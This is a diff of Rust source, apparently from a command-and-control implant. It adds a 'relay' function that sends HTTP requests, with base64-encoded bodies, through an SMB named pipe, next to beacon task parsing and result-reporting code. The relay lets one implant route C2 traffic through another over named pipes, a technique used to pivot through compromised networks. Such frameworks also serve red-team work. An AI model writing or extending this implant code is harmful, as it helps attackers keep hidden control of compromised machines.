@@ -169,6 +169,21 @@ pub fn send_result(h: PipeHandle, agent_id: &str, task_id: i64, output: &str, er
     pipe_write_msg(h, req.as_bytes())
 }
 
+pub fn relay(h: PipeHandle, method: &str, path: &str, body: &[u8]) -> Option<(u32, Vec<u8>)> {
+    let req = serde_json::json!({
+        "type": "RELAY",
+        "method": method,
+        "path": path,
+        "body_b64": STANDARD.encode(body),
+    }).to_string();
+    if !pipe_write_msg(h, req.as_bytes()) { return None; }
+    let response = pipe_read_msg(h)?;
+    let value: serde_json::Value = serde_json::from_slice(&response).ok()?;
+    let status = value["status"].as_u64()? as u32;
+    let body = STANDARD.decode(value["body_b64"].as_str().unwrap_or("")).ok()?;
+    Some((status, body))
+}
+
 /// Parse SMB beacon response — JSON array directly (not wrapped in {"tasks":[...]}).
 pub fn parse_smb_tasks(resp: &[u8]) -> Vec<super::transport::TaskWire> {
     use base64::Engine;
